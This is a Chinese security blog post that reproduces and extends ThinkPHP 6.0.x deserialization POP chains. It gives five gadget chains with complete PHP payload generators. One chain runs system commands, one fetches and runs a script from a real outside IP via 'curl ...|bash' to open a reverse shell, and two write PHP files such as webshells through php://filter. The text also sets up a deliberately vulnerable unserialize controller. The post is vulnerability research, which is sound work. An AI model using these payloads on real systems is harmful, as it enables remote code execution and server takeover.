# thinkphp6.0x反序列化复现及再挖掘

阅读量 **390802**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-12 10:30:44

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t012b360d7e52c07268.jpg)

## 环境搭建

复现环境:thinkphp6.0.1

php:7.3.4

thinkphp6只能通过composer安装还不能安装旧版本可以到这里去下载

<https://www.jsdaima.com/blog/205.html>

    
    
    php think run
    

在app/controller/Index.php下添加控制器

    
    
    <?php
    namespace app\controller;
    
    use app\BaseController;
    
    class Index extends BaseController
    {
        public function index()
        {
            if(isset($_POST['data'])){
                unserialize(base64_decode($_POST['data']));
            }else{
                highlight_file(__FILE__);
            }
        }
    }
    

## 第一条链子

###  漏洞分析

在 ThinkPHP5.x 的POP链中，入口都是 think\process\pipes\Windows 类，通过该类触发任意类的`__toString`
方法。但是 ThinkPHP6.x 的代码移除了 think\process\pipes\Windows 类，而POP链 `__toString` 之后的
Gadget 仍然存在，所以我们得继续寻找可以触发`__toString`方法的点

寻找destruct方法,定位到了

    
    
    vendor\topthink\think-orm\src\Model.php
    

![](https://p0.ssl.qhimg.com/t0193de8dfad3f71d78.png)

发现$this->lazySave参数可控,这样就可以去调用save函数

跟进save()

    
    
    public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);
    
        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
    
        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
    
        if (false === $result) {
            return false;
        }
    
        // 写入回调
        $this->trigger('AfterWrite');
    
        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->set      = [];
        $this->lazySave = false;
    
        return true;
    }
    

发现这句语句

    
    
    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
    

不过要执行到这句语句需要满足一个if判断条件,否则会直接返回false

    
    
    if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
    

跟进isEmpty()

![](https://p0.ssl.qhimg.com/t017dae4d1ebd3e5058.png)

$this->data只要不为空即可,然后`$this->trigger('BeforeWrite')`的值需要为true

跟进trigger()

![](https://p2.ssl.qhimg.com/t013b938b5191e5c5cb.png)

直接让$this->withEvent的值为false进入if返回true即可

这样就执行到了三目运算符语句

    
    
    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
    

分别跟进updateData和insertData去寻找可利用的地方

跟进updateData

    
    
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }
    
        $this->checkData();
    
        // 获取有更新的数据
        $data = $this->getChangedData();
    
        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
    
            return true;
        }
    
        if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }
    
        // 检查允许字段
        $allowFields = $this->checkAllowFields();
    
        foreach ($this->relationWrite as $name => $val) {
            if (!is_array($val)) {
                continue;
            }
    
            foreach ($val as $key) {
                if (isset($data[$key])) {
                    unset($data[$key]);
                }
            }
        }
    
        // 模型更新
        $db = $this->db();
        $db->startTrans();
    
        try {
            $this->key = null;
            $where     = $this->getWhere();
    
            $result = $db->where($where)
                ->strict(false)
                ->cache(true)
                ->setOption('key', $this->key)
                ->field($allowFields)
                ->update($data);
    
            $this->checkResult($result);
    
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
    
            $db->commit();
    
            // 更新回调
            $this->trigger('AfterUpdate');
    
            return true;
        } catch (\Exception $e) {
            $db->rollback();
            throw $e;
        }
    }
    

根据poc指向下一个利用点是checkAllowFields

但是要进入并调用该函数，需要先通过前面两处的if语句

![](https://p2.ssl.qhimg.com/t01adf1d181b1d4e13c.png)

第一个if我们开始已经让$this->trigger()的返回值为true了,不用进入这个if

第二个if要判断$data是否为空,这就要跟进getChangeData去看看了

跟进getChangeData

![](https://p2.ssl.qhimg.com/t0136cd6bcc0a017a41.png)

值需要让$this->force为true就可以直接返回可控的$data,然后不为空就可以不用进入第二个if

跟进一下checkAllowFields

    
    
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $query = $this->db();
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
    
                $this->field = $query->getConnection()->getTableFields($table);
            }
    
            return $this->field;
        }
    
        $field = $this->field;
    
        if ($this->autoWriteTimestamp) {
            array_push($field, $this->createTime, $this->updateTime);
        }
    
        if (!empty($this->disuse)) {
            // 废弃字段
            $field = array_diff($field, $this->disuse);
        }
    
        return $field;
    }
    

当$this->field不为空并且$this->schema为空的时候可以调用db函数

![](https://p0.ssl.qhimg.com/t01adab4a021132d786.png)

跟进db

![](https://p4.ssl.qhimg.com/t0171cbb285cc306deb.png)

这里有拼接字符串操作,$this->name和$this->suffix只要为对应的类名就可以去调用`__toString`了

调用链如下

    
    
    __destruct()——>save()——>updateData()——>checkAllowFields()——>db()——>$this->table . $this->suffix（字符串拼接）——>toString()
    

`__toString`的话就可以直接用tp5的后半段链子,只是有一点点不同而已

不过这里还有一个问题,Model是一个抽象类,不能实例化

![](https://p4.ssl.qhimg.com/t019ee79244d5e65d0b.png)

我们需要去找他的一个子类Pivot (src/model/Pivot.php)进行实例化

![](https://p3.ssl.qhimg.com/t0138fcaed67fccf96f.png)

问题解决了就来跟进`__toString`方法了

定位到

    
    
    vendor\topthink\think-orm\src\model\concern\Conversion.php
    

![](https://p2.ssl.qhimg.com/t01ca0f3b2d450a4472.png)

跟进toJson

![](https://p5.ssl.qhimg.com/t016d957042db7f7402.png)

跟进toArray()

![](https://p4.ssl.qhimg.com/t01e20f937044d1f82e.png)

对 $data进行遍历，其中 $key 为 $data 的键。默认情况下，会进入第二个 elseif 语句，从而将 $key 作为参数调用
getAttr() 方法。

跟进getAttr()

![](https://p1.ssl.qhimg.com/t01948d7e186be1b4d4.png)

先回调用getData,跟进一下

![](https://p4.ssl.qhimg.com/t01dcdf1d840312ef3e.png)

跟进getRealFieldName

![](https://p3.ssl.qhimg.com/t010b1cc25a9609560c.png)

直接返回一个值,这里的$this->strict可控,只要为true就返回$name的值,而$name是刚才传进来的$key

所以这里就相当于返回$name

回到getData函数

![](https://p5.ssl.qhimg.com/t0172b2a83a963b046b.png)

这里就相当于直接返回了应该$this->data[$key]

回到getAttr函数,下一步会调用getValue

![](https://p4.ssl.qhimg.com/t01093e7bb4a3246fe2.png)

跟进getValue

![](https://p4.ssl.qhimg.com/t01bac65357389cadb4.png)

看到这里是一个可用rce的点

    
    
    $value   = $closure($value, $this->data);
    

先判断是否存在$this->withAttr[$fieldName]这里的$this->withAttr[$fieldName]并不是数组所以会进入else语句

执行到

    
    
    $closure = $this->withAttr[$fieldName];
    $value   = $closure($value, $this->data);
    

$this->withAttr[$fieldName]和$this->data是可控的,而$this->data即是他的键值

那只要让$closure=’system’然后$value为要执行的命令即可

$value的值是在getData里面可以控制的

都能控制,那这样就可以去rce了

###  漏洞复现

poc如下

    
    
    <?php
    
    namespace think;
    
    abstract class Model
    {
        use model\concern\Attribute;
        private $lazySave = false;
        private $exists = true;
        private $data = [];
        function __construct($obj)
        {
            $this->lazySave = true;
            $this->exists = true;
            $this->data = ['key' => 'whoami'];
            $this->table = $obj;
            $this->strict = true;
            $this->visible = ["key" => 1];
        }
    }
    
    namespace think\model\concern;
    
    trait Attribute
    {
        private $withAttr = ["key" => "system"];
    }
    
    namespace think\model;
    
    use think\Model;
    
    class Pivot extends Model
    {
        function __construct($obj)
        {
            parent::__construct($obj);
        }
    }
    
    $obj1 = new Pivot(null);
    echo base64_encode(serialize(new Pivot($obj1)));
    

这里的poc中并没有看到Conversion这个类,是因为在Model类中的引用已经有Conversion这个类了,当我们实例化他的子类的时候,可以去调用了他引用里面的`__toString`方法

![](https://p1.ssl.qhimg.com/t0193d7749f7f16e28b.png)

Attribute和Conversion这两个类与Model类是通的,所以属性可以全部在Model里面定义

自己写了个exp

    
    
    <?php
    
    namespace think\model {
    
        use think\Model;
    
        class Pivot extends Model
        {
        }
        $obj1 = new Pivot('');
        echo base64_encode(serialize(new Pivot($obj1)));
    }
    
    namespace think {
    
        use think\model\concern\Attribute;
    
        abstract class Model
        {
            private $lazySave;
            private $exists;
            private $data = [];
            private $withAttr = [];
            public function __construct($obj)
            {
                $this->lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->table = $obj;
                $this->data = ['key' => 'whoami'];
                $this->visible = ["key" => 1];
                $this->withAttr = ['key' => 'system'];
            }
        }
    }
    
    namespace think\model\concern {
        trait Attribute
        {
        }
    }
    

## 第二条链子

###  漏洞分析

寻找其他的入口点

    
    
    vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
    

![](https://p0.ssl.qhimg.com/t014252a24f815b1e97.png)

跟进save,这是一个抽象类,所以我们应该到其子类去寻找可用的save方法

![](https://p2.ssl.qhimg.com/t019be359c23f18c16e.png)

    
    
    src/think/filesystem/CacheStore.php
    

![](https://p2.ssl.qhimg.com/t01fa35e5d661637a71.png)

其实我看了看另外几个save方法,就这个最简单了

$this->store可控,可以去调用任意类的set方法,没有则调用`__call`

这里先出发去找可用的set方法

定位到src/think/cache/driver/File.php

    
    
    public function set($name, $value, $expire = null): bool
    {
        $this->writeTimes++;
    
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
    
        $expire   = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);
    
        $dir = dirname($filename);
    
        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }
    
        $data = $this->serialize($value);
    
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
    
        $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
    
        if ($result) {
            clearstatcache();
            return true;
        }
    
        return false;
    }
    

跟进getExpireTime

![](https://p1.ssl.qhimg.com/t01191a4e1ab1d6d409.png)

发现没什么可用的

跟进getCacheKey

![](https://p0.ssl.qhimg.com/t016d25861ea79dc594.png)

这里其实就是为了查看进入该方法是否出现错误或者直接return了

所以这里`$this->options['hash_type']`不能为空

返回了一个字符拼接的值,`$this->options['path']`可控,又可以去调用上一条链子的`__toString`

###  漏洞复现

poc

    
    
    <?php
    
    namespace League\Flysystem\Cached\Storage {
        abstract class AbstractCache
        {
            protected $autosave;
            public function __construct()
            {
                $this->autosave = false;
            }
        }
    }
    
    namespace think\filesystem {
    
        use League\Flysystem\Cached\Storage\AbstractCache;
        use think\cache\driver\File;
    
        class CacheStore extends AbstractCache
        {
            protected $store;
            protected $expire;
            protected $key;
            public function __construct()
            {
                $this->store = new File();
                $this->expire = 1;
                $this->key = '1';
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    
    namespace think\cache {
    
        use think\model\Pivot;
    
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
            public function __construct()
            {
                $this->options = [
                    'expire' => 0,
                    'cache_subdir' => true,
                    'prefix' => '',
                    'path' => new Pivot(),
                    'hash_type' => 'md5',
                    'data_compress' => false,
                    'tag_prefix' => 'tag:',
                    'serialize' => ['system'],
                ];
            }
        }
    }
    
    namespace think\cache\driver {
    
        use think\cache\Driver;
    
        class File extends Driver
        {
        }
    }
    
    namespace think {
    
        use think\model\concern\Attribute;
    
        abstract class Model
        {
            private $data = [];
            private $withAttr = [];
            public function __construct()
            {
                $this->data = ['key' => 'whoami'];
                $this->visible = ["key" => 1];
                $this->withAttr = ['key' => 'system'];
            }
        }
    }
    
    namespace think\model\concern {
        trait Attribute
        {
        }
    }
    
    namespace think\model {
    
        use think\Model;
    
        class Pivot extends Model
        {
        }
    }
    

![](https://p4.ssl.qhimg.com/t01ef0d890605ba0e91.png)

## 第三条链子

###  漏洞分析

回到上一条链子的set方法

![](https://p0.ssl.qhimg.com/t01a0f4b218f4c55e79.png)

当我们退出getCacheKey后往下面走会进入一个serialize方法

跟进serialize

![](https://p2.ssl.qhimg.com/t01b24b2232ee8aa09f.png)

这里的`$this->options['serialize']`可控,绕过$data的值可控的话就可以去RCE

回到前面可控$data怎么来的

![](https://p5.ssl.qhimg.com/t01774ded0aca4684c2.png)

serialize方法的参数值是set方法的$value

继续回溯到set方法前面的save方法看看$value是如何来的

![](https://p0.ssl.qhimg.com/t01afd2cedae1a4f5b7.png)

是$content的值,跟进getForStorage()

![](https://p2.ssl.qhimg.com/t012d9bc7892bdb742c.png)

返回一个json格式的数据

所以这里$data是一个被处理后的json数据,不过system函数能够处理json数据

![](https://p5.ssl.qhimg.com/t0127d7633a09e746ef.png)

不过这里只有linux系统适用,因为反引号在window不起作用

###  漏洞复现

poc

    
    
    <?php
    
    namespace League\Flysystem\Cached\Storage {
        abstract class AbstractCache
        {
            protected $autosave = false;
            protected $complete = "`curl xxx.xxx.xxx.xxx|bash`";
        }
    }
    
    namespace think\filesystem {
    
        use League\Flysystem\Cached\Storage\AbstractCache;
    
        class CacheStore extends AbstractCache
        {
            protected $key = "1";
            protected $store;
    
            public function __construct($store = "")
            {
                $this->store = $store;
            }
        }
    }
    
    namespace think\cache {
        abstract class Driver
        {
            protected $options = [
                'expire' => 0,
                'cache_subdir' => true,
                'prefix' => '',
                'path' => '',
                'hash_type' => 'md5',
                'data_compress' => false,
                'tag_prefix' => 'tag:',
                'serialize' => ['system'],
            ];
        }
    }
    
    namespace think\cache\driver {
    
        use think\cache\Driver;
    
        class File extends Driver
        {
        }
    }
    
    namespace {
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo base64_encode(serialize($cache));
    }
    

这里执行命令虽然不知道为什么没有回显，但是可以curl去反弹shell

bash并没有反弹成功

![](https://p5.ssl.qhimg.com/t01d30af556bb0cff59.png)

成功反弹shell

    
    
    <?php
    
    namespace League\Flysystem\Cached\Storage {
        abstract class AbstractCache
        {
            protected $autosave = false;
            protected $complete = "`curl 47.93.248.221|bash`";
        }
    }
    
    namespace think\filesystem {
    
        use League\Flysystem\Cached\Storage\AbstractCache;
        use think\cache\driver\File;
    
        class CacheStore extends AbstractCache
        {
            protected $store;
            protected $key = "1";
            public function __construct()
            {
                $this->store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    
    namespace think\cache\driver {
    
        use think\cache\Driver;
    
        class File extends Driver
        {
            protected $options = [
                'expire'        => 0,
                'cache_subdir'  => true,
                'prefix'        => '',
                'path'          => '',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['system'],
            ];
        }
    }
    

## 第四条链子

###  漏洞分析

继续回到set方法往下走

![](https://p5.ssl.qhimg.com/t012bf15e57943fe662.png)

发现一个file_put_contents函数

$filename是getCacheKey()的返回值

跟进getCacheKey()

![](https://p4.ssl.qhimg.com/t0119687e51d5fde3ab.png)

`$this->options['path']`和$name都是可控的,那文件名就可控了

然后就直接让`$this->options['hash_type']`为md5,`$this->options['path']`为filter过滤器,$name=1

文件名就是1的md5编码了

两个if可以控制参数不进入即可

文件名可控了,再回过头来看$data的值

![](https://p1.ssl.qhimg.com/t01d04b1a3fdf7d824d.png)

serialize方法返回了第一个$data的值,跟进serialize方法

![](https://p3.ssl.qhimg.com/t010c9cff1b2298fb59.png)

第三条链子已经提到了这么去控制这个返回值了,所以这里返回值也是可控的

不过$serialize的值需要是一个函数,并且不影响$data的值,这里可以用trim函数

可以看看效果

    
    
    <?php
    $a = json_encode([[], 'dasdasdsa']);
    echo $a;
    echo trim($a);
    

![](https://p2.ssl.qhimg.com/t016ac86f58a7e18366.png)

而json_decode反而会让这里抛出异常

回到set继续往下看

![](https://p2.ssl.qhimg.com/t017a5d5a23df32cbde.png)

这里还有一个字符串拼接,前面标签内的东西可以直接用`php://filter`过滤器去除了所以写入的内容就是前面serialize方法返回的值

然后就是写入shell了

其实这里字符拼接,$data可控也是可以去调用toString的

###  漏洞复现

poc

    
    
    <?php
    
    namespace League\Flysystem\Cached\Storage {
        abstract class AbstractCache
        {
            protected $autosave = false;
            protected $complete = "aaaPD9waHAgcGhwaW5mbygpOz8+";
        }
    }
    
    namespace think\filesystem {
    
        use League\Flysystem\Cached\Storage\AbstractCache;
        use think\cache\driver\File;
    
        class CacheStore extends AbstractCache
        {
            protected $store;
            protected $key = "1";
            public function __construct()
            {
                $this->store = new File();
            }
        }
        echo base64_encode(serialize(new CacheStore()));
    }
    
    namespace think\cache {
        abstract class Driver
        {
        }
    }
    
    namespace think\cache\driver {
    
        use think\cache\Driver;
    
        class File extends Driver
        {
            protected $options = [
                'expire'        => 1,
                'cache_subdir'  => false,
                'prefix'        => false,
                'path'          => 'php://filter/write=convert.base64-decode/resource=',
                'hash_type'     => 'md5',
                'data_compress' => false,
                'tag_prefix'    => 'tag:',
                'serialize'     => ['trim']
            ];
        }
    }
    

![](https://p1.ssl.qhimg.com/t0174be7a98d489a8ed.png)

写入了文件,在public目录下

![](https://p0.ssl.qhimg.com/t0128bf4e71ab3a5afe.png)

## 第五条链子

###  漏洞分析

入口点还是

    
    
    vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
    

![](https://p0.ssl.qhimg.com/t013dd5c9612bc79fd1.png)

之前提到过,这是一个抽象类,他有几个子类对这个save方法进行了重写

之前我们找的是这下面的save方法

![](https://p2.ssl.qhimg.com/t01f5bac7ff1683ecbb.png)

再看看其他的save方法,定位到src/Storage/Adapter.php

![](https://p0.ssl.qhimg.com/t017dedda5df528b21f.png)

$this->file是可控的,$contents是getForStorage方法的返回值

跟进看看

![](https://p1.ssl.qhimg.com/t01da056a4649441e16.png)

和之前的有点类似,返回一个json格式的数组

这里可以去想办法去找到可用的call方法 ,或者可用的has方法

还有一种,就是找到一个类同时存在has方法和可用的update方法和write方法

定位到src/Adapter/Local.php

同时存在以上三个方法

![](https://p4.ssl.qhimg.com/t01ee6e6bb2e8c4e07c.png)

![](https://p0.ssl.qhimg.com/t016da60a5bf4903a64.png)

![](https://p5.ssl.qhimg.com/t01f7c9ac2603c47372.png)

看has方法

    
    
    public function has($path)
    {
        $location = $this->applyPathPrefix($path);
    
        return file_exists($location);
    }
    

判断文件是否存在

跟进applyPathPrefix

![](https://p4.ssl.qhimg.com/t01a7d4a50f4f1cbef7.png)

![](https://p4.ssl.qhimg.com/t01029b0df53658de11.png)

跟进getPathPrefix

![](https://p2.ssl.qhimg.com/t0133e8e40430b72698.png)

直接返回一个可控值$this->pathPrefix

如果$this->pathPrefix为空,applyPathPrefix的返回值就是$path

$path是之前可控的$this->file

这里只有构建一个不存在的文件名即可进入save方法的if

跟进write

![](https://p4.ssl.qhimg.com/t010861fda9fa4937ad.png)

有一个file_put_contents

$location的值和刚才一样已经分析过了

然后进入if判断，$content的值也是可控的,这里就可以用来写文件

占尽天时地利人和,下一步就是写马了

###  漏洞复现

    
    
    <?php
    
    namespace League\Flysystem\Cached\Storage;
    
    abstract class AbstractCache
    {
        protected $autosave = false;
        protected $cache = ['<?php phpinfo();?>'];
    }
    
    
    namespace League\Flysystem\Cached\Storage;
    
    class Adapter extends AbstractCache
    {
        protected $adapter;
        protected $file;
    
        public function __construct($obj)
        {
            $this->adapter = $obj;
            $this->file = 'DawnT0wn.php';
        }
    }
    
    
    namespace League\Flysystem\Adapter;
    
    abstract class AbstractAdapter
    {
    }
    
    
    namespace League\Flysystem\Adapter;
    
    use League\Flysystem\Cached\Storage\Adapter;
    use League\Flysystem\Config;
    
    class Local extends AbstractAdapter
    {
    
        public function has($path)
        {
        }
    
        public function write($path, $contents, Config $config)
        {
        }
    }
    
    $a = new Local();
    $b = new Adapter($a);
    echo base64_encode(serialize($b));
    

成功写入

![](https://p1.ssl.qhimg.com/t01bf6fa28937b00628.png)

不过这里不能控制complete的值去写入,里面应该是会检验php标签

其实这里后半部分的gadget还在,只要找到可控的字符拼接这种类型的都可以去调用到后面的toString,在复现过程中,看到了几个地方都可以去调用toString的,不过只写了第二条链子

参考链接

<https://whoamianony.top/2020/12/31/>

<https://xz.aliyun.com/t/10396#toc-3>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Dawntown** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/258567](/post/id/258567)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)

 **+1** __5赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=23esG0vWhhTA3EgUSCgatw&s=40&t=1606641335)
Dawntown

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

